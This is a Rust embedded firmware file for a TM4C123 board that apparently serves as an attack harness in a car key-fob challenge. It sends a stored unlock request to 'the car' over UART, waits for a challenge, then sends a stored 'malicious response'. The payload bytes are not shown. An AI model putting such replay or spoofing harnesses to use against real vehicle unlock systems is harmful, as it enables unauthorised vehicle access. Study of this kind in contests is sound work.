#![no_main]
#![no_std]

extern crate panic_halt;

use cortex_m_rt::entry;
use tm4c123x_hal::{
    delay::Delay,
    gpio::{GpioExt, AF1},
    prelude::_embedded_hal_serial_Read,
    serial::{NewlineMode, Serial},
    sysctl::SysctlExt,
    time::Bps,
    CorePeripherals, Peripherals,
};

#[entry]
fn main() -> ! {
    let core = CorePeripherals::take().unwrap();
    let peripherals = Peripherals::take().unwrap();
    let sys = peripherals.SYSCTL.constrain();
    let clocks = sys.clock_setup.freeze();
    let mut porta = peripherals.GPIO_PORTA.split(&sys.power_control);
    let pa0 = porta.pa0.into_af_push_pull::<AF1>(&mut porta.control);
    let pa1 = porta.pa1.into_af_push_pull::<AF1>(&mut porta.control);
    let mut uart0 = Serial::uart0(
        peripherals.UART0,
        pa1,
        pa0,
        (),
        (),
        Bps(115200),
        NewlineMode::Binary,
        &clocks,
        &sys.power_control,
    );
    let mut portb = peripherals.GPIO_PORTB.split(&sys.power_control);
    let pb0 = portb.pb0.into_af_push_pull::<AF1>(&mut portb.control);
    let pb1 = portb.pb1.into_af_push_pull::<AF1>(&mut portb.control);
    let mut uart1 = Serial::uart1(
        peripherals.UART1,
        pb1,
        pb0,
        (),
        (),
        Bps(115200),
        NewlineMode::Binary,
        &clocks,
        &sys.power_control,
    );

    uart0.write_all(b"Sending unlock request...");

    // We're going to send it across UART1 to the car
    let unlock_req = include_bytes!("unlock_req.bin");
    uart1.write_all(unlock_req);

    let mut found_challenge = false;

    // Delay by a bit, reading UART1 constantly for a challenge.
    // If we read any bytes, we say we found a challenge.
    for _ in 0..10_000_000 {
        if uart1.read().is_ok() {
            found_challenge = true;
        }
    }

    if found_challenge {
        uart0.write_all(b"Found challenge.");
    } else {
        uart0.write_all(b"Never got a challenge.");
    }

    uart0.write_all(b"Sending malicious response...");

    // We're going to send it across UART1 to the car
    let unlock_resp = include_bytes!("unlock_response.bin");
    uart1.write_all(unlock_resp);

    loop {}
}
